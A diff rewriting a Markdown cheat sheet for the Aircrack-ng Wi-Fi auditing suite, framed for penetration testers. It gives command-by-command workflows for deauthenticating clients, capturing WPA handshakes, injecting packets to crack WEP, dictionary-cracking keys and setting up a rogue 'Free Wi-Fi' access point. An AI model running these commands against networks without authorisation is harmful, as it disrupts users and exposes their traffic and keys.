@@ -1,184 +1,296 @@
-### **Aircrack-ng Tool: Overview & Commands**
+ 
+---
 
-**Aircrack-ng** is a powerful suite of tools used for wireless network security assessments, specifically focused on cracking WEP and WPA-PSK keys. It is highly used in penetration testing and network security audits to test the strength of wireless network encryption.
+# 🛰️ What is Aircrack-ng?
 
-### **Aircrack-ng Tool Suite Components:**
-1. **airmon-ng** - For enabling monitor mode on wireless interfaces.
-2. **airodump-ng** - Captures raw packets from wireless networks, including WPA/WEP handshakes.
-3. **airolib-ng** - Used to manage WPA2/PSK password cracking.
-4. **aircrack-ng** - The actual tool used to crack WEP and WPA-PSK keys from captured traffic.
-5. **airreplay-ng** - Used to inject packets to a network (used for attack purposes, such as deauthentication).
-6. **airtun-ng** - Creates virtual interfaces for tunneling.
-7. **packetforge-ng** - Used for crafting custom packets to inject into a network.
+**Aircrack-ng** is a **complete suite of tools for auditing wireless networks**. It is widely used for **cracking WEP and WPA/WPA2-PSK keys**, **monitoring Wi-Fi traffic**, **packet injection**, and **capturing handshakes**.
 
-### **How to Install Aircrack-ng on Kali Linux:**
-Aircrack-ng is pre-installed on Kali Linux, but if you need to install it manually, use the following command:
-```bash
-sudo apt-get install aircrack-ng
-```
-
-### **1. Enabling Monitor Mode (airmon-ng):**
-To perform wireless attacks, the wireless interface must be in **monitor mode**. This can be done using `airmon-ng`.
-
-#### Command:
-```bash
-sudo airmon-ng start wlan0
-```
-- This puts the **wlan0** interface into monitor mode, which is necessary for sniffing packets.
-- Afterward, the interface will be named something like **wlan0mon**.
-
-To stop monitor mode:
-```bash
-sudo airmon-ng stop wlan0mon
-```
-
-### **2. Scanning for Wireless Networks (airodump-ng):**
-Once the interface is in monitor mode, you can use `airodump-ng` to discover nearby wireless networks and capture packets, including WPA handshakes.
-
-#### Command to scan networks:
-```bash
-sudo airodump-ng wlan0mon
-```
-- This will display a list of all nearby wireless networks.
-- The important fields are:
-  - **BSSID**: The MAC address of the access point.
-  - **ESSID**: The name of the Wi-Fi network.
-  - **CH**: The channel the network is using.
-  - **Encryption**: WEP/WPA/WPA2, etc.
-
-#### Command to capture packets from a specific AP:
-```bash
-sudo airodump-ng --bssid [BSSID] -c [CHANNEL] -w [output_file] wlan0mon
-```
-- Replace `[BSSID]` with the target AP’s BSSID.
-- Replace `[CHANNEL]` with the AP’s channel (found in the scan results).
-- Replace `[output_file]` with the desired output file name.
-
-This command will capture all packets to and from the target AP into the file specified.
-
-### **3. Deauthentication Attack (airreplay-ng):**
-You can use the **deauthentication attack** to disconnect clients from the target network. This is useful when trying to capture a WPA handshake.
-
-#### Command:
-```bash
-sudo aireplay-ng --deauth 10 -a [BSSID] wlan0mon
-```
-- Replace `[BSSID]` with the target AP’s BSSID.
-- The number `10` represents how many deauthentication packets you want to send.
-- This will disconnect clients from the AP, causing them to reconnect and generate a WPA handshake.
-
-### **4. Cracking WEP (aircrack-ng):**
-WEP encryption is considered weak, and it can be cracked easily if you have enough packets. Once you have captured enough packets using `airodump-ng`, use `aircrack-ng` to crack the WEP key.
-
-#### Command:
-```bash
-sudo aircrack-ng [capture_file].cap
-```
-- Replace `[capture_file]` with the name of the file where the packets were stored.
-
-### **5. Cracking WPA/WPA2 (aircrack-ng with wordlist):**
-To crack WPA/WPA2, you need to capture the handshake first (with `airodump-ng`), and then use **aircrack-ng** along with a wordlist to attempt to crack the password.
-
-#### Command:
-```bash
-sudo aircrack-ng [capture_file].cap -w [wordlist_file]
-```
-- Replace `[capture_file]` with the name of the file containing the WPA handshake.
-- Replace `[wordlist_file]` with the path to your wordlist file (e.g., `/usr/share/wordlists/rockyou.txt`).
-
-### **6. Aircrack-ng Dictionary Attack (WPA/WPA2):**
-You can use a dictionary attack for WPA/WPA2 cracking by providing a wordlist.
-
-#### Example:
-```bash
-sudo aircrack-ng [capture_file].cap -w /path/to/wordlist.txt
-```
-If the password is found in the wordlist, **aircrack-ng** will display the WPA key.
-
-### **7. Creating Custom Packets (packetforge-ng):**
-With `packetforge-ng`, you can craft custom packets for testing or attacking purposes.
-
-#### Example:
-```bash
-sudo packetforge-ng --bssid [BSSID] --channel [CHANNEL] --essid [ESSID] --wep -w [output_file].cap
-```
-- Replace `[BSSID]` with the target AP’s BSSID.
-- Replace `[CHANNEL]` with the AP's channel.
-- Replace `[ESSID]` with the network name (SSID).
-- The `--wep` option creates a WEP packet.
-
-### **8. Creating Fake AP (airbase-ng):**
-`airbase-ng` can create a fake access point to lure users into connecting to it. This can be useful for various attacks, like phishing or man-in-the-middle.
-
-#### Example:
-```bash
-sudo airbase-ng -e "FakeAP" -c 6 wlan0mon
-```
-- `-e "FakeAP"` specifies the SSID of the fake AP.
-- `-c 6` sets the channel of the fake AP to channel 6.
-
-### **9. Cracking WPA/WPA2 Handshake with Pyrit (Optional for Aircrack-ng):**
-Pyrit is another tool that can be used to speed up WPA/WPA2 cracking, particularly when utilizing the power of a GPU.
-
-#### Command:
-```bash
-pyrit -r [capture_file].cap -i [wordlist_file] attack_passthrough
-```
-
-### **10. Cracking WPA WPA2 Using Hashcat (GPU Acceleration):**
-You can also use **Hashcat** for cracking WPA/WPA2 by utilizing GPUs for high performance.
-
-#### Example:
-```bash
-hashcat -m 2500 [capture_file].hccapx [wordlist_file]
-```
-- This is more efficient than using **aircrack-ng** in some cases when you have a powerful GPU.
+🛠️ It is a **must-know tool** for ethical hackers and penetration testers conducting **Wi-Fi security assessments**.
 
 ---
 
-### **Summary of Key Commands:**
+## 🧩 Aircrack-ng Tool Suite Components
 
-1. **Enable Monitor Mode:**
-   ```bash
-   sudo airmon-ng start wlan0
-   ```
+| Tool             | Description                                            |
+| ---------------- | ------------------------------------------------------ |
+| `airmon-ng`      | Puts wireless card into **monitor mode**               |
+| `airodump-ng`    | Captures raw packets and Wi-Fi handshakes              |
+| `aireplay-ng`    | Performs **packet injection**, deauth, fake auth, etc. |
+| `aircrack-ng`    | Cracks WEP/WPA-PSK keys from capture files             |
+| `airbase-ng`     | Creates rogue AP (evil twin)                           |
+| `airdecloak-ng`  | Removes cloaking from WEP capture files                |
+| `packetforge-ng` | Crafts custom packets (for WEP)                        |
+| `ivstools`       | Manipulates IVs for WEP cracking                       |
 
-2. **Scan for Networks:**
-   ```bash
-   sudo airodump-ng wlan0mon
-   ```
+---
 
-3. **Capture Packets from Target AP:**
-   ```bash
-   sudo airodump-ng --bssid [BSSID] -c [CHANNEL] -w [output_file] wlan0mon
-   ```
+## 🛠️ Installation
 
-4. **Deauth Attack to Capture Handshake:**
-   ```bash
-   sudo aireplay-ng --deauth 10 -a [BSSID] wlan0mon
-   ```
+### ✅ On Kali Linux
 
-5. **Crack WEP Key:**
-   ```bash
-   sudo aircrack-ng [capture_file].cap
-   ```
+Already installed. If not:
 
-6. **Crack WPA/WPA2 Key:**
-   ```bash
-   sudo aircrack-ng [capture_file].cap -w [wordlist_file]
-   ```
+```bash
+sudo apt update
+sudo apt install aircrack-ng -y
+```
 
-7. **Craft Custom Packets:**
-   ```bash
-   sudo packetforge-ng --bssid [BSSID] --channel [CHANNEL] --essid [ESSID] --wep -w [output_file].cap
-   ```
+### ✅ On Ubuntu/Debian
 
-8. **Create Fake Access Point:**
-   ```bash
-   sudo airbase-ng -e "FakeAP" -c 6 wlan0mon
-   ```
+```bash
+sudo apt install aircrack-ng
+```
 
-### **Conclusion:**
-Aircrack-ng is a powerful tool for wireless network security testing. With a wide range of tools within the suite, it is capable of performing network scanning, packet sniffing, WEP/WPA key cracking, and even attacking APs. Proper knowledge and usage of Aircrack-ng can help assess the security of wireless networks.
+### ✅ On Arch
 
-Let me know if you'd like more information or examples on specific commands!
+```bash
+sudo pacman -S aircrack-ng
+```
+
+### ✅ From Source
+
+```bash
+git clone https://github.com/aircrack-ng/aircrack-ng.git
+cd aircrack-ng
+autoreconf -i
+./configure
+make
+sudo make install
+```
+
+---
+
+## 🧾 Typical Workflow for WPA/WPA2 Cracking
+
+### 1. Enable Monitor Mode
+
+```bash
+airmon-ng start wlan0
+```
+
+➡️ This creates `wlan0mon` for packet capture.
+
+---
+
+### 2. Scan Networks
+
+```bash
+airodump-ng wlan0mon
+```
+
+➡️ Shows BSSID, ESSID, channel, encryption, etc.
+
+---
+
+### 3. Target Specific Network
+
+```bash
+airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon
+```
+
+* `-c`: channel
+* `--bssid`: target AP
+* `-w`: file to save packets
+
+---
+
+### 4. Force Deauthentication
+
+```bash
+aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF -c XX:YY:ZZ:... wlan0mon
+```
+
+* Forces client to disconnect
+* WPA handshake is captured when they reconnect
+
+---
+
+### 5. Crack WPA Key
+
+```bash
+aircrack-ng -w /usr/share/wordlists/rockyou.txt -b AA:BB:CC:DD:EE:FF capture-01.cap
+```
+
+✅ If password is in the wordlist, Aircrack-ng will find it.
+
+---
+
+## 📌 WEP Cracking Example
+
+1. Start Monitor Mode
+
+```bash
+airmon-ng start wlan0
+```
+
+2. Capture IVs
+
+```bash
+airodump-ng --bssid <BSSID> -c <channel> -w wep_capture wlan0mon
+```
+
+3. Inject Packets
+
+```bash
+aireplay-ng -3 -b <BSSID> wlan0mon
+```
+
+4. Crack WEP Key
+
+```bash
+aircrack-ng wep_capture-01.cap
+```
+
+✅ WEP can often be cracked in seconds if enough IVs are collected.
+
+---
+
+## 📂 Output Files
+
+* `.cap`: Packet capture (used by aircrack-ng)
+* `.csv`: CSV-formatted summary
+* `.netxml`: For compatibility with other tools
+
+---
+
+## 🧠 Other Useful Commands
+
+### ✔️ To stop monitor mode:
+
+```bash
+airmon-ng stop wlan0mon
+```
+
+### ✔️ Check interface status:
+
+```bash
+iwconfig
+```
+
+### ✔️ Check connected clients (STATIONs):
+
+```bash
+airodump-ng wlan0mon
+```
+
+---
+
+## ⚙️ aircrack-ng Options
+
+```bash
+aircrack-ng [options] capture_file.cap
+```
+
+| Option | Description                         |
+| ------ | ----------------------------------- |
+| `-a`   | Force attack mode: 1 = WEP, 2 = WPA |
+| `-b`   | Target BSSID                        |
+| `-w`   | Wordlist file                       |
+| `-e`   | Target ESSID                        |
+| `-l`   | Output cracked key to a file        |
+| `-q`   | Quiet mode                          |
+
+---
+
+## 🔐 WPA/WPA2 Handshake Capture Tips
+
+* Needs **at least one client** to capture handshake
+* Use `--deauth` to force a reauthentication
+* Use `Wireshark` to verify if the 4-way handshake exists
+
+---
+
+## 💣 aireplay-ng Attack Modes
+
+| Attack | Description                |
+| ------ | -------------------------- |
+| `-0`   | Deauthentication           |
+| `-1`   | Fake authentication        |
+| `-2`   | Interactive packet replay  |
+| `-3`   | ARP replay (WEP injection) |
+| `-9`   | Injection test             |
+
+---
+
+## 🧪 Example Scenario – WPA2 Crack
+
+### 1. Start monitor:
+
+```bash
+airmon-ng start wlan0
+```
+
+### 2. Find target:
+
+```bash
+airodump-ng wlan0mon
+```
+
+### 3. Focus:
+
+```bash
+airodump-ng -c 6 --bssid 00:14:6C:7E:40:80 -w test wlan0mon
+```
+
+### 4. Force disconnect:
+
+```bash
+aireplay-ng --deauth 10 -a 00:14:6C:7E:40:80 wlan0mon
+```
+
+### 5. Crack key:
+
+```bash
+aircrack-ng -w /usr/share/wordlists/rockyou.txt test-01.cap
+```
+
+---
+
+## 🧪 Example – WEP Crack in 5 Steps
+
+```bash
+airmon-ng start wlan0
+airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w wep wlan0mon
+aireplay-ng -3 -b AA:BB:CC:DD:EE:FF wlan0mon
+aircrack-ng wep-01.cap
+```
+
+---
+
+## 🧰 Advanced: Airbase-ng for Rogue AP
+
+```bash
+airbase-ng -e "Free Wi-Fi" -c 11 wlan0mon
+```
+
+* Creates a fake AP named “Free Wi-Fi”
+* Can be combined with **MITM** and **captive portals**
+
+---
+
+## 🔐 Legal and Ethical Use
+
+**⚠️ Warning:** Use only on **your own networks** or those you have **explicit permission** to test. Unauthorized use is illegal.
+
+---
+
+## 🧩 Tools You Can Combine With Aircrack-ng
+
+* **Wireshark** – analyze capture files
+* **Bettercap / MITMf** – for MITM attacks
+* **Wifite / Fluxion** – GUI wrappers around aircrack-ng
+* **Cowpatty** – faster WPA cracking with pre-computed hashes
+* **Crunch** – generate wordlists
+
+---
+
+## 📚 Resources
+
+* 🔗 [Official Site](https://www.aircrack-ng.org/)
+* 🔗 [GitHub](https://github.com/aircrack-ng/aircrack-ng)
+* 📘 `man aircrack-ng`
+
+---
+
+
+ 
